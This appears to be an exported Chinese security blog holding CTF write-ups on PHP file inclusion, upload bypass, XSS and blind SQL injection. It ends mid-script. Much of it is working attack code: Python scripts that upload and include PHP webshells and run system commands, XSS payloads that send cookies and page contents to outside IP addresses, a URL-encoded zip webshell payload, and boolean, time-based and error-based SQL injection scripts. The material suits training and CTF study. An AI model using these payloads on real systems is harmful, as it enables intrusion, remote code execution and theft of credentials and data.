    <content type="text"><![CDATA[一些简单的文件包含内容吧 文件包含介绍严格来说，文件包含漏洞是“代码注入“的一种。代码注入的原理就是注入一段用户能控制的脚本或代码，并让服务端执行。 代码注入的典型代表就是文件包含。文件包含可能会出现在JSP、PHP、ASP等语言中。 常见的导致文件包含的函数如下： PHP: include(), include_once(), require(),require_once, fopen(), readfile() …. JSP/Servlet: ava.io.File(),java.io.FileReader() … ASP:include file, include virtual… PHP文件包含主要由这四个函数完成： include() require() include_once() require_once() 当使用这4个函数包含一个新的文件时，该文件将作为PHP代码执行，PHP内核并不会在意该被包含文件是什么类型。所以如果被包含的是txt文件、图片文件、远程URL，也都将作为PHP代码执行。 比如DVWA low等级的文件上传在同目录留一个包含了可执行的PHP代码的txt文件再执行漏洞URL，发现代码被执行了 要成功的利用文件包含漏洞，需要满足下面两个条件： 1. include（）等函数通过动态变量的方式引入需要包含的文件 2. 用户能够控制该动态变量 下面我们深入看看文件包含漏洞还能导致哪些后果 本地文件包含普通本地文件包含能够打开并包含本地文件的漏洞，被称为本地文件包含漏洞（Local File Inclusion/LFI）。比如下面这段代码就存在LFI漏洞。 用户能够控制参数file。当file的值为../../etc/passwd时，PHP将访问/etc/passwd文件。 但是在此之前，还需要解决Include‘/home/wwwrun/’.$file.’.php’; 这种写法将变量与字符串连接起来，假如用户控制$file的值为../../etc/passwd，结果为include‘/home/wwwrun/../../etc/passwd.php’;被包含的文件实际上是/etc/passwd.php，但是实际上这个文件是不存在的 有限制的本地文件包含%00截断PHP内核是由C语言实现的，因此使用了C语言中 的一些字符串处理函数。在连接字符串时，0字节（\x00）将作为字符串结束符。所以在这个地方，只要在最后加入一个0字节，就能截断file变量之后的字符串，即 ../../etc/passwd\0 在Web输入时只需URL编码一下，变成 ../../etc/passwd%00 (需要 magic_quotes_gpc=off，PHP小于5.3.4有效) %00截断目录遍历?file=../../../../../../../../../var/www/%00 (需要 magic_quotes_gpc=off，unix文件系统，比如FreeBSD，OpenBSD，NetBSD，Solaris) 构造长目录截断但是光防御0字节是肯定不够的。俗话说上有政策下有对策，国内的安全研究者cloie发现了一个技巧——利用操作系统对目录最大长度的限制，可以不需要0字节而达到截断的目的。 目录字符串在Windows下256字节、Linux下4096字节时达到最大值，最大值长度之后的字符将被丢弃。 而只需通过【./】就可以构造出足够长的目录。比如 ././././././././././././././././passwd 或者 ////////////////////////passwd 又或者 ../1/abc/../1/abc/../1/abc.. (php版本小于5.2.8(?)可以成功，linux需要文件名长于4096，windows需要长于256) 点号截断?file=../../../../../../../../../boot.ini/………[…]………… (php版本小于5.2.8(?)可以成功，只适用windows，点号需要长于256) 普通远程文件包含如果PHP的配置选项allow_url_include为ON的话（默认是关闭的），则include/require函数是可以加载远程文件的，这种漏洞被称为远程文件包含漏洞（Remote File Inclusion，简称RFI） 例如： 在$basePath前没有设置任何障碍，因此攻击者可以构造类似如下的恶意URL： /?param=http://attacker/phpshell.txt? 最终加载的代码实际上执行了： require_once &apos;http://attacker/phpshell.txt?/action/m_share.php&apos;; 问号后面的代码最终被解释成URL的querystring（查询用字符串）,这也算一种截断方式，这是利用远程文件包含漏洞时的常见技巧。同样，%00也可以作为截断符号。 本地文件包含的利用技巧本地文件包含漏洞，是有机会执行php代码的，但这取决于一些条件 经过不懈研究，安全研究者总结出了一下几种常见的技巧，用于本地文件包含后执行php代码。 包含用户上传的文件 包含data://或php://input等伪协议 包含session文件 包含日志文件 包含/proc/self/environ 包含上传的临时文件 包含其他应用创建的文件，如数据库文件，缓存文件，应用日志等，需 具体问题具体分析 百度杯web无聊逛wp,突然看到百度杯web的wp,然后看了几道稍微简单一点的，觉得挺有意思的就记录一下. include这是道长见识的题目，不得不说好。题目提示： 没错！就是文件包含漏洞。代码很简单考的也都是简单的知识点。根据代码必须设置path的值查看phpinfo（）得到 allow_url_fopen off 能否打开URL文件 allow_url_include on 能否包含URL文件（file_get_contents 不受影响） 再来谈谈PHP伪协议php://input 输入数据流php://input 代表可以访问请求的原始数据，简单来说POST请求的情况下，php://input可以获取到post的数据。 比较特殊的一点，enctype=”multipart/form-data” 的时候 php://input 是无效的。 那么在include(&#39;php://input&#39;)情况下，PHP将其视为URL资源只有在allow_url_include = on 的情况下才能使用 本题就是利用这一点实现webshell的执行 这题主要是了解,当allow_url_include = on时可以用input伪协议来达到命令执行效果. notebook这题非常不错考的基础知识点，和大家分享一下 首先看见的就是文件包含，利用扫描工具扫一下看见了phpinfo.php &amp; robots.txt 回到主页面上典型的文件包含.像登陆这种题目 不是注入就是session漏洞没有扫描到注入点，先考虑的就是session漏洞 看一下phpinfo都提供什么信息看见了session的路径信息，尝试去包含发现怎么都没有回显（这里实现注册username = &lt;?php phpinfo(); ?&gt;） 接下来在phpinfo里发现有基础路径所以我们只能利用相对路径尝试获取session文件这里怀疑他在生成session的时候重设了session存放路径，果不其然 没有回显怀疑是过滤了关键字，利用base64转一下重新上传恶意脚本1&lt;?php $_GET[&apos;a&apos;](base64_encode($_GET[&apos;b&apos;])); ?&gt; 这题主要是思路，登陆题目一般都是注入和session漏洞.]]></content>
  </entry>
  <entry>
    <title><![CDATA[xman个人排位赛(纪念第一个xss)]]></title>
    <url>%2F2017%2F08%2F31%2FXMAN%2F</url>
    <content type="text"><![CDATA[记录一下被虐的道理 Babyweb第一次做这种文件上传包含漏洞吧。 看到page之后,想到文件包含,先用&quot;php://filter/read=convert.base64-encode/resource=&quot;filter伪协议读一下源码.整理了一下几个重要的源码如下:123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081***Upload.php:&lt;html lang=&quot;zh-CN&quot;&gt; &lt;head&gt; &lt;meta charset=&quot;utf-8&quot;&gt;&lt;?php$error=$_FILES[&apos;pic&apos;][&apos;error&apos;];$tmpName=$_FILES[&apos;pic&apos;][&apos;tmp_name&apos;];$name=$_FILES[&apos;pic&apos;][&apos;name&apos;];$size=$_FILES[&apos;pic&apos;][&apos;size&apos;];$type=$_FILES[&apos;pic&apos;][&apos;type&apos;];try&#123; if($name!==&quot;&quot;) &#123; $name1=substr($name,-4); if(($name1!==&quot;.gif&quot;) and ($name1!==&quot;.jpg&quot;)) &#123; echo &quot;hehe&quot;; echo &quot;&lt;script language=javascript&gt;alert(&apos;不允许的文件类型！&apos;);history.go(-1)&lt;/script&gt;&quot;; exit; &#125; if($type!==&quot;image/jpeg&quot;&amp;&amp;$type!==&quot;image/gif&quot;) &#123; //echo mime_content_type($tmpName); echo &quot;&lt;script language=javascript&gt;alert(&apos;不允许的文件类型！&apos;);history.go(-1)&lt;/script&gt;&quot;; exit; &#125; if(is_uploaded_file($tmpName))&#123; $time=time(); $rootpath=&apos;uploads/&apos;.$time.$name1; if(!move_uploaded_file($tmpName,$rootpath))&#123; echo &quot;&lt;script language=&apos;JavaScript&apos;&gt;alert(&apos;文件移动失败!&apos;);window.location=&apos;index.php?page=submit&apos;&lt;/script&gt;&quot;; exit; &#125; else&#123; sleep(2); if ($type==&apos;image/jpeg&apos;) &#123; $im = @imagecreatefromjpeg($rootpath); if(!$im)&#123; $im = imagecreatetruecolor(150, 30); $bg = imagecolorallocate($im, 255, 255, 255); $text_color = imagecolorallocate($im, 0, 0, 255); imagefilledrectangle($im, 0, 0, 150, 30, $bg); imagestring($im, 3, 5, 5, &quot;Error loading image&quot;, $text_color); &#125; else &#123; $time=time(); $new_rootpath=&apos;uploads/&apos;.$time.$name1; imagejpeg($im,$new_rootpath); imagedestroy($im); &#125; &#125; else if ($type==&apos;image/gif&apos;) &#123; $im = @imagecreatefromgif($rootpath); if(!$im)&#123; $im = imagecreatetruecolor(150, 30); $bg = imagecolorallocate($im, 255, 255, 255); $text_color = imagecolorallocate($im, 0, 0, 255); imagefilledrectangle($im, 0, 0, 150, 30, $bg); imagestring($im, 3, 5, 5, &quot;Error loading image&quot;, $text_color); &#125; else &#123; $time=time(); $new_rootpath=&apos;uploads/&apos;.$time.$name1; imagegif($im,$new_rootpath); imagedestroy($im); &#125; &#125; unlink($rootpath); &#125; &#125; echo &quot;图片ID：&quot;.$time; &#125;&#125;catch(Exception $e)&#123; echo &quot;ERROR&quot;;&#125;// ?&gt; &lt;/html&gt; 观察代码，可以发现上传的文件的临时文件名是time函数生成的，而且在sleep(2)之后就会经过一系列复杂的变化(反正没看懂),所以要在两秒内把上传的文件包含。 而且通过扫描，发现uploads目录可以访问 所以现在的思路就是，写两个脚本，一个来上传文件，另一个来通过访问uploads来读到最新的那个文件名，然后去包含它1234567891011121314***upload.py：#!/usr/bin/env python # encoding: utf-8 import requests url = &quot;http://202.112.51.217:8199/upload.php&quot; data = &#123; &apos;title&apos;: &apos;admin&apos;, &apos;url&apos;: &apos;admin&apos; &#125; files = &#123;&apos;pic&apos;: (&apos;b.jpg&apos;, open(&quot;b.zip&quot;).read(), &apos;image/jpeg&apos;)&#125; # 这里使用 requests 库来上传文件有几种方式 # 这种方式可以控制文件名以及文件类型 # 可以用来绕过基于客户端的文件名和文件类型检测 response = requests.post(url, data=data, files=files) content = response.content print content 写一句话木马，用base64加密之后保存为b.php， 然后压缩为b.zip,绕过检验很简单，上传的为b.jpg和image/jpeg即可 1234567891011121314151617***include.py#!/usr/bin/env python # encoding: utf-8 import requests url = &quot;http://202.112.51.217:8199/uploads/&quot; response = requests.get(url) content = response.content files = [] for line in content.split(&quot;\n&quot;): if &quot;href=&quot; in line: files.append(line.split(&quot;href=\&quot;&quot;)[1].split(&quot;\&quot;&gt;&quot;)[0]) filename = files[-1] print filename#url = &quot;http://202.112.51.217:8199/index.php?page=php://filter/read=convert.base64-decode/resource=phar://uploads/&quot;+filename+&quot;/b&amp;c=system(&apos;ls&apos;);&quot; url = &quot;http://202.112.51.217:8199/index.php?page=php://filter/read=convert.base64-decode/resource=phar://uploads/&quot;+filename+&quot;/b&amp;c=system(&apos;cat ./xxxxxxxxxasdasf_flag.php&apos;);&quot; print requests.get(url).content 主要解释一下url那行,从右到左看,c是传入的参数,b是文件名,因为会自动加.php,所以其实是b.php,filename是最新的那个文件名,基本上就是你上传的那个,phar去读取,所以连起来就是用phar去读取你的那个b.php,然后经过base64解密。 XSS1由于对js和html一点都不懂,所以做起这种题目一点思路都没有,看着大佬们一个一个标签一个一个方法 这是xman个人排位赛上的一道题，赛后拿着大佬的wp和payload一行一行敲出来的 12345678910111213&lt;script&gt;var iframe=document.body.createElement(&apos;iframe&apos;);iframe.src=&quot;./&quot;;document.body.appendChild(iframe);iframe.onload=function()&#123; var c=document.cookie; var n=document.createElement(&quot;link&quot;); n.setAttribute(&quot;rel&quot;,&quot;prefetch&quot;); n.setAttribute(&quot;href&quot;,&quot;//101.200.58.21:8080/?&quot; + c&quot;); document.head.appendChild(n);&#125;&lt;/script&gt; 这估计是最简单的xss攻击脚本了，就是简单的把document.cookie打到101.200.58.21:8080，而且没有任何的过滤,连script都可以用，然后监听vps就可以了唉web就是个坑 XSS2其实跟第一个题目差不多，也没过滤东西，不过需要这次flag不在cookie里，而是需要读取flag.php123456789101112131415161718var iframe = document.createElement(&quot;iframe&quot;);iframe.src = &quot;./flag.php&quot;;document.body.appendChild(iframe); iframe.onload = function ()&#123; var flag = document.getElementsByTagName(&quot;iframe&quot;)[0].contentWindow.document.getElementsByTagName(&quot;body&quot;)[0].innerHTML;var n0t = document.createElement(&quot;link&quot;);n0t.setAttribute(&quot;rel&quot;, &quot;prefetch&quot;);n0t.setAttribute(&quot;href&quot;, &quot;//121.42.189.18:8080/?&quot; +flag);document.head.appendChild(n0t);&#125; 其中唯一不一样的就是var flag = document.getElementsByTagName(“iframe”)[0].contentWindow.document.getElementsByTagName(“body”)[0].innerHTML; 这句代码,其实可以分成三段，第一段是得到iframe子窗口，第二段contentwindow是进入子窗口,第三段是读取子窗口的body变量用html实体输出 附上MD5验证码爆破脚本：123456789101112131415# -*- coding:utf8 -*-import hashlib def crack_code(code): s = 100000 while 1: m2 = hashlib.md5() m2.update(repr(s)) if (m2.hexdigest()[0:4]==code): return s break s+=1 print crack_code(&apos;818d&apos;)]]></content>
  </entry>
  <entry>
    <title><![CDATA[ZJGSCTF]]></title>
    <url>%2F2017%2F08%2F31%2FZJGSCTF%2F</url>
    <content type="text"><![CDATA[zjgsctf平台上的部分wp ZJGSCTF 部分writeup哇 黑进服务器题目链接：http://218.76.35.74:20129 进去之后老规矩先右键看源码，提示说，去到include.php之后提示说需要file，应该是文件包含，用filter协议&quot;php://filter/read=convert.base64-encode/resource=&quot;读取upload.php base64解密之后如下:1234567891011121314151617181920212223242526****upload.php&lt;form action=&quot;&quot; enctype=&quot;multipart/form-data&quot; method=&quot;post&quot; name=&quot;upload&quot;&gt;file:&lt;input type=&quot;file&quot; name=&quot;file&quot; /&gt;&lt;br&gt; &lt;input type=&quot;submit&quot; value=&quot;upload&quot; /&gt;&lt;/form&gt;&lt;?phpif(!empty($_FILES[&quot;file&quot;]))&#123; echo $_FILES[&quot;file&quot;]; $allowedExts = array(&quot;gif&quot;, &quot;jpeg&quot;, &quot;jpg&quot;, &quot;png&quot;); @$temp = explode(&quot;.&quot;, $_FILES[&quot;file&quot;][&quot;name&quot;]); $extension = end($temp); if (((@$_FILES[&quot;file&quot;][&quot;type&quot;] == &quot;image/gif&quot;) || (@$_FILES[&quot;file&quot;][&quot;type&quot;] == &quot;image/jpeg&quot;) || (@$_FILES[&quot;file&quot;][&quot;type&quot;] == &quot;image/jpg&quot;) || (@$_FILES[&quot;file&quot;][&quot;type&quot;] == &quot;image/pjpeg&quot;) || (@$_FILES[&quot;file&quot;][&quot;type&quot;] == &quot;image/x-png&quot;) || (@$_FILES[&quot;file&quot;][&quot;type&quot;] == &quot;image/png&quot;)) &amp;&amp; (@$_FILES[&quot;file&quot;][&quot;size&quot;] &lt; 102400) &amp;&amp; in_array($extension, $allowedExts)) &#123; move_uploaded_file($_FILES[&quot;file&quot;][&quot;tmp_name&quot;], &quot;upload/&quot; . $_FILES[&quot;file&quot;][&quot;name&quot;]); echo &quot;file upload successful!Save in: &quot; . &quot;upload/&quot; . $_FILES[&quot;file&quot;][&quot;name&quot;]; &#125; else &#123; echo &quot;upload failed!&quot;; &#125;&#125;?&gt; 绕过方式很简单，只要后缀是jpg，且content-type是image/jpeg即可。 一句话木马如下： 12***a.php&lt;?php eval($_POST(&apos;aaa&apos;))?&gt; 将php打包成zip,然后重命名成jpg,上传 在include.php页面利用文件包含和phar伪协议来读取jpg中的php文件。如下：这里一开始没加system，一直不成功。 然后flag文件藏在哪儿反正我没找到，潘大佬告诉我用find / -name ‘*flag*‘ 这才找到了flag 登陆有奖&amp;登陆有奖plus进去之后看到url里的page就一激灵，八成又是文件包含的题目，还是一样的套路，先试试filter读源码&quot;php://filter/read=convert.base64-encode/resource=&quot;base64解密出来两个比较重要的页面源码:1234567891011121314***index.php&lt;?php$pwhash=&quot;ffd313052dab00927cb61064a392f30ee454e70f&quot;;if (@$_GET[&apos;log&apos;]) &#123; if(file_exists($_GET[&apos;log&apos;].&quot;.log&quot;))&#123; include(&quot;flag.txt&quot;);&#125;&#125;if(@$_GET[&apos;page&apos;] != &apos;index&apos;)&#123; include((@$_GET[&apos;page&apos;]?$_GET[&apos;page&apos;].&quot;.php&quot;:&quot;main.php&quot;));&#125;?&gt; 1234567891011121314151617181920***login.php&lt;?php$login=@$_POST[&apos;login&apos;];$password=@$_POST[&apos;password&apos;];if(@$login==&quot;admin&quot; &amp;&amp; sha1(@$password)==$pwhash)&#123; include(&apos;flag.txt&apos;);&#125;else if (@$login&amp;&amp;@$password&amp;&amp;@$_GET[&apos;debug&apos;]) &#123; echo &quot;Login error, login credentials has been saved to ./log/&quot;.htmlentities($login).&quot;.log&quot;; $logfile = &quot;./log/&quot;.$login.&quot;.log&quot;; file_put_contents($logfile, $login.&quot;\n&quot;.$password);&#125; ?&gt; &lt;center&gt; login&lt;br/&gt;&lt;br/&gt; &lt;form action=&quot;&quot; method=&quot;POST&quot;&gt; &lt;input name=&quot;login&quot; placeholder=&quot;login&quot;&gt;&lt;br/&gt; &lt;input name=&quot;password&quot; placeholder=&quot;password&quot;&gt;&lt;br/&gt;&lt;br/&gt; &lt;input type=&quot;submit&quot; value=&quot;Go!&quot;&gt; &lt;/form&gt; &lt;/center&gt; plan A看潘大佬的wp才发现还有这种操作，因为在login.php中$pwhash并没有被赋值，这个变量是在index.php里面被赋值的，所以如果直接访问login.php而不经过index.php的话，则$pwhash这个变量的值其实是null，这样就很舒服了。所以只需要根据phphash的特性，构造password[]，则hash之后返回false，null==false Plan B看login.php里如果url里有debug参数的话，则会将用户名和密码写入到日志里,以’\n’分割。 先想到的是写个php一句话到日志里，然后用文件包含去包含执行php代码至于为什么要写password这个参数，可能是因为Login.php里login出现的比较多，反正两个参数都能写，那就用password好了 去看一下写进去的东西看来是写进去了 那去包含一下吧好吧，好像失败了。。这里我一开始以为是%00截断后面的’.php’失败了，就用长度截断试了试，也失败了。。 去找一下原因好吧，5.4.16版本，那么高。。%00和长度截断都是要求php版本低于5.3.4，其中%00还需要php的magic_quotes_gpc为OFF状态那看来截断不行了，那换个角度试试 如果想绕过’.php’,可以用zip或者phar,但是这两个协议都需要压缩包。既然写一句话木马不行，那写个压缩包进去试试。 但是还有个问题,login和password之间用’\n’分割，这样会影响压缩包的解压，观察一下压缩包的结构。能看到有个0A即’\n’,这样就很舒服。 将十六进制导出，再将空格替换成% 1login=%50%4b%03%04&amp;password=%00%02%00%00%00%20%b1%0c%4b%e5%4a%ef%5e%1c%00%00%00%1c%00%00%00%05%00%1c%00%63%2e%70%68%70%55%54%09%00%03%fb%0b%8f%59%fb%0b%8f%59%75%78%0b%00%01%04%e8%03%00%00%04%e8%03%00%00%3c%3f%70%68%70%20%65%76%61%6c%28%24%5f%52%45%51%55%45%53%54%5b%63%5d%29%3b%3f%3e%0a%50%4b%01%02%1e%03%0a%00%02%00%00%00%20%b1%0c%4b%e5%4a%ef%5e%1c%00%00%00%1c%00%00%00%05%00%18%00%00%00%00%00%01%00%00%00%a4%81%00%00%00%00%63%2e%70%68%70%55%54%05%00%03%fb%0b%8f%59%75%78%0b%00%01%04%e8%03%00%00%04%e8%03%00%00%50%4b%05%06%00%00%00%00%01%00%01%00%4b%00%00%00%5b%00%00%00%00%00 试试看这样就可以把完整的压缩包拼凑出来了 利用phar协议试试因为自动加上’.php’，所以其实是phar://./log/文件名.log/c.php，其中c=phpinfo()是传进去的参数 上antsword吧(安利一波，很好看), 双击打开flag.txt即可 你能登录吗？究极进化版这里直接copy潘大佬的wp了 看长相像SQL注入，试了下先判断用户名，讲道理不可能写死判断是否是admin，而是查数据库看用户是否存在，那么这里可能就是一个注入点了，再讲道理密码都会哈希处理一般不会是注入点，所以要是有注入就只能在这里了，另外，这里是判断用户是否存在那么只有盲注了，继续测试发现它会显示字符被过滤alert(‘illegal character!!@_@’);，这个比较明显就可以先测试过滤了那些字符，经测试含,,|,&amp;,and,or,union,like,*, (所有空白符)等，于是先想办法构造布尔语句，本来构造方法很多，但是要绕空格就pass很多了，这里使用普通运算就可以了:12345admin&apos;-1-&apos;-1 #不能用+，被过滤了admin&apos;/&apos;1 #不能用*，被过滤了admin&apos;^1^&apos;1admin&apos;%1%&apos;1.......... 好啦，现在有布尔语句了，往里面填值就好了:构造的语句不能有空格，逗号，ORD(含or)，于是： admin&#39;-(ascii(substr(database()from(2)))&gt;110)-&#39;-1 首先直接用exists(select(uname)from(admin))验证，猜出了表名和列名：admin:uname:passwd可以少写点脚本，先把这个跑出来，不能做了再去跑所有的：1234567891011121314151617##老夫编程就是一把梭，什么二分查找，多线程 tan90°，能出结果就好了import requestsurl = &quot;http://218.76.35.74:20130/login.php&quot;unameq = &quot;admin&apos;-(ascii(substr((select(group_concat(passwd))from(admin))from(&quot;password = &apos;&apos;for i in range(1,50): for j in range(1,128): uname = unameq+str(i)+&quot;)))=&quot;+str(j)+&quot;)-&apos;-1&quot; data = &#123;&apos;uname&apos;:uname,&apos;passwd&apos;:&apos;123&apos;&#125; r = requests.post(url=url, data=data) if &apos;password&apos; in r.text: password+=chr(j) print(password) break if j==127: print(&quot;完成!&quot;) exit(0) 跑出结果是50f87a3a3ad48e26a5d9058418fb78b5 cmd5 查出是shuangshuang登录进去：可以进行命令执行，但是空格被过滤了，百度可知可以${IFS}替换空格http://smilejay.com/2011/12/bash_ifs/ 而且发现它只回显最后一行，猜测后台代码如下:12345$command = $_POST['cmd'];if(strpos($command, ' '))&#123;die('Not allowed!');&#125;system($command.' | tail -n 1'); 跟tail对应的就是head,所以构造命令如但是好像没啥子，那就往上翻吧这个目录有点奇怪进去看看找到flag 看起来有点难标准的sql注入，先看看过滤了什么吧很明显select被过滤了，这样一个一个试，发现还有空格也被过滤了。这么看来的话，还是能过的，脚本如下:12345678910111213141516171819202122232425262728293031323334#coding:utf-8import requestsimport timedef payload(field,x,i): xx = &quot;admin&apos;/**/and/**/if(ascii(substring(%s,%s,1))=%s,sleep(3),sleep(0))/**/and/**/&apos;1&apos;=&apos;1&quot;%(field,x,i) #xx = &quot;admin&apos;/**/and/**/if(ascii(substring(%s,%s,1))=%s,sleep(3),sleep(0))/**/and/**/&apos;1&apos;=&apos;1&quot;%(field,x,i) url = &apos;http://ctf5.shiyanbar.com/basic/inject/index.php?admin=%s&amp;pass=1&amp;action=login&apos;%(xx) start = time.time() response = requests.get(url) end = time.time() if end-start &gt;3: return 1 else : return 0print &quot;start&quot;fields=[&apos;uname&apos;,&apos;uid&apos;,&apos;name&apos;,&apos;username&apos;,&apos;pw&apos;,&apos;passwd&apos;,&apos;password&apos;]for field in fields: id=0 flag=&apos;&apos; for x in range(1,100): for i in range(32,128): if payload(field,x,i)==1: flag+=chr(i) print field+&apos;:&apos;+flag break if i==127: print field+&quot; is over&quot; id=1 break if id==1: break 代码写的有点丑。。我这里字段是一个一个猜出来的，如果师傅有什么好的方法可以私聊给我，或者师傅遇到过哪些用户名和密码花式字段都可以分享一下，可以弄个小字典来跑一下 亦可赛艇右键查看源码可以看到source.txt123456789101112131415161718192021222324252627282930313233343536373839404142434445464748&lt;?phperror_reporting(0);if (!isset($_POST['uname']) || !isset($_POST['pwd'])) &#123; echo '&lt;form action="" method="post"&gt;'."&lt;br/&gt;"; echo '&lt;input name="uname" type="text"/&gt;'."&lt;br/&gt;"; echo '&lt;input name="pwd" type="text"/&gt;'."&lt;br/&gt;"; echo '&lt;input type="submit" /&gt;'."&lt;br/&gt;"; echo '&lt;/form&gt;'."&lt;br/&gt;"; echo '&lt;!--source: source.txt--&gt;'."&lt;br/&gt;"; die;&#125;function AttackFilter($StrKey,$StrValue,$ArrReq)&#123; if (is_array($StrValue))&#123; $StrValue=implode($StrValue); &#125; if (preg_match("/".$ArrReq."/is",$StrValue)==1)&#123; print "姘村彲杞借垷锛屼害鍙禌鑹囷紒"; exit(); &#125;&#125;$filter = "and|select|from|where|union|join|sleep|benchmark|,|\(|\)";foreach($_POST as $key=&gt;$value)&#123; AttackFilter($key,$value,$filter);&#125;$con = mysql_connect("XXXXXX","XXXXXX","XXXXXX");if (!$con)&#123; die('Could not connect: ' . mysql_error());&#125;$db="XXXXXX";mysql_select_db($db, $con);$sql="SELECT * FROM interest WHERE uname = '&#123;$_POST['uname']&#125;'";$query = mysql_query($sql); if (mysql_num_rows($query) == 1) &#123; $key = mysql_fetch_array($query); if($key['pwd'] == $_POST['pwd']) &#123; print "CTF&#123;XXXXXX&#125;"; &#125;else&#123; print "浜﹀彲璧涜墖锛�"; &#125;&#125;else&#123; print "涓€棰楄禌鑹囷紒";&#125;mysql_close($con);?&gt; 主要是这几行代码:123456789101112$sql="SELECT * FROM interest WHERE uname = '&#123;$_POST['uname']&#125;'";$query = mysql_query($sql); if (mysql_num_rows($query) == 1) &#123; $key = mysql_fetch_array($query); if($key['pwd'] == $_POST['pwd']) &#123; print "CTF&#123;XXXXXX&#125;"; &#125;else&#123; print "浜﹀彲璧涜墖锛�"; &#125;&#125;else&#123; print "涓€棰楄禌鑹囷紒";&#125; 有两层限制,第一个限制是要查询结果为一行,可以用&#39; or &#39;1&#39;=&#39;1&#39; limit 1#来绕过,而且如果不加limit的话就会绕不过,这就说明不止一个用户,用offset看了下有两个用户.接下来第二层限制的话用一个神奇的东西group by with rollup group by pwd 是按照pwd来分组，此处是为了搭配 with rollup使用with rollup 统计pwd组的信息，这里没用任何统计函数(sum,avg…)，多出的那一行的pwd列只能是NULL所以到目前取出的的数据类似这样： +——-+——-+| uname | pwd |+——-+——-+| usr1 | * || usr2 | * || usr2 | NULL |+——-+——-+ 然后是limit 1 offset 2 就是跳过两个，只用第三个数据。 那么最终取出的数据就是这样了 +——-+——-+| uname | pwd |+——-+——-+| usr2 | NULL |+——-+——-+ 这样]]></content>
  </entry>
  <entry>
    <title><![CDATA[blind_SQL_injection script]]></title>
    <url>%2F2017%2F08%2F25%2Fblind-SQL-injection-script%2F</url>
    <content type="text"><![CDATA[就是突然觉得收集一些脚本，而不是丢掉，这样会让自己做题效率高很多，所以把作过的题目的脚本都收集起来吧。 简单的盲注脚本，根据错误信息判断1234567891011121314151617181920212223242526272829303132#coding:utf-8import requestsurl = 'http://58.154.33.13:8002/login.php'payloads='1234567890qwertyuiopasdfghjklzxcvbnm_@QWERTYUIOPASDFGHJKLZXCVBNM,*'def exp(i,x): #xx= "' or if(substring((select database()) from %s for 1)='%s',0,1) and '1'='1" #xx = "' or if(substring((select group_concat(table_name) from information_schema.columns where table_schema=database()) from %s for 1)='%s',0,1) and '1'='1" #xx = "' or if(substring((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='admin') from %s for 1)='%s',0,1) and '1'='1" xx = "' or if(substring((select group_concat(password) from admin) from %s for 1)='%s',0,1) and '1'='1" data=&#123;'username':xx %(i,x),'password':'123'&#125; response = requests.post(url,data = data) if response.content.find('用户名错误')&gt;0: return 1 else : return 0ans=''print 'star'for i in range(1,100): for x in payloads: if exp(i,x)==1: ans+=x print ans break if x=='*': print "over" break 如果改成基于时间的盲注的话，则只需将上方的exp改成如下1234567891011def exp(i,x): first_time=time.time() xx="' or if(substring((select database()) from %s for 1)='%s',sleep(5),0)" data=&#123;'username':xx %(i,x),'password':'123'&#125; #print data response = requests.post(url,data = data) next_time=time.time() if (next_time-first_time) &gt; 4: return 1 else : return 0 或者1234567891011121314def exp(i,x): #xx = &quot;&apos; or if(substring((select database()) from %s for 1)=&apos;%s&apos;,benchmark(10000000,md5(&apos;test&apos;)),0) and &apos;1&apos;=&apos;1&quot; #xx = &quot;&apos; or if(substring((select group_concat(table_name) from information_schema.columns where table_schema=database()) from %s for 1)=&apos;%s&apos;,benchmark(10000000,md5(&apos;test&apos;)),0) and &apos;1&apos;=&apos;1&quot; #xx = &quot;&apos; or if(substring((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&apos;users233&apos;) from %s for 1)=&apos;%s&apos;,benchmark(10000000,md5(&apos;test&apos;)),0) and &apos;1&apos;=&apos;1&quot; xx = &quot;&apos; or if(substring((select group_concat(p4sswo3d) from users233) from %s for 1)=&apos;%s&apos;,benchmark(10000000,md5(&apos;test&apos;)),0) and &apos;1&apos;=&apos;1&quot; data=&#123;&apos;id&apos;:xx %(i,x)&#125; first_time=time.time() response = requests.post(url,data = data) next_time=time.time() if (next_time-first_time) &gt; 2: return 1 else : return 0 布尔语句的盲注脚本12345678910111213141516import requestsurl = "http://218.76.35.74:20130/login.php"unameq = "admin'-(ascii(substr((select(group_concat(passwd))from(admin))from("password = ''for i in range(1,50): for j in range(1,128): uname = unameq+str(i)+")))="+str(j)+")-'-1" data = &#123;'uname':uname,'passwd':'123'&#125; r = requests.post(url=url, data=data) if 'password' in r.text: password+=chr(j) print(password) break if j==127: print("完成!") exit(0) 条件： 有密码错误或者用户名错误返回信息 过滤了,,|,&amp;,and,or,union,like,*, (所有空白符)等 这里发现了mysql一个神奇的地方，就是字符串在进行运算的时候，会和php一样自动变成数字，比如’admin’-‘-1’的结果会是1,详情参考php，而且我还去试了下把username这一元素改成int类型，发现还是一样的结果 猜测后台脚本应该是先判断用户名，再判断密码。所以上面这个脚本如果命中的话，查询结果会把所有不以数字开头的用户名都返回，然后返回密码错误。如果没命中的话，就会返回用户名错误 第三届上海大学生网络安全赛盲注题payload如下：1234567891011121314151617181920212223242526272829#coding:utf-8import requestsimport urllibdef exp(i,x): url = &apos;http://0d2c92830f414f70ae4739aa450aec00fd79f6f552734def.game.ichunqiu.com/index.php?id=&apos; #xx= &quot;1+%26%26+ascii(substring((select+database())+from+&quot;+str(i)+&quot;+for+1))-&quot;+str(x) #xx = &quot;1+%26%26+ascii(substring((select+table_name+from+information_schema.columns+where+table_schema+like+database()+limit+1)+from+&quot;+str(i)+&quot;+for+1))-&quot;+str(x) #xx = &quot;1+%26%26+ascii(substring((select+column_name+from+information_schema.columns+where+table_name+like+%22f14g%22+limit+1)+from+&quot;+str(i)+&quot;+for+1))-&quot;+str(x) xx = &quot;1+%26%26+ascii(substring((select+f14g+from+words.f14g)+from+&quot;+str(i)+&quot;+for+1))-&quot;+str(x) u=url+xx #print u response = requests.get(url=u) #print response.content if response.content.find(&apos;Hello Hacker!!&apos;)&gt;0: return 0 else : return 1ans=&apos;&apos;print &apos;star&apos;for i in range(1,100): for x in range(32,127): if exp(i,x)==1: ans+=chr(x) print ans break 过滤了and和=，and用&amp;&amp;来代替，=用like来代替 上面这题也可以用报错注入来做，脚本如下：1234567891011121314151617181920212223import requests flag=&apos;&apos; for i in range (50): # url =&quot;http://57b8a27f43c6473f91026a50a1ab287f41ab53c0f5144744.game.ichunqiu.com/index.php?id=extractvalue(1,%20concat(0x3a,(select%20schema_name frominformation_schema.schemata limit &#123;&#125;,1)))&quot;.format(i) # url 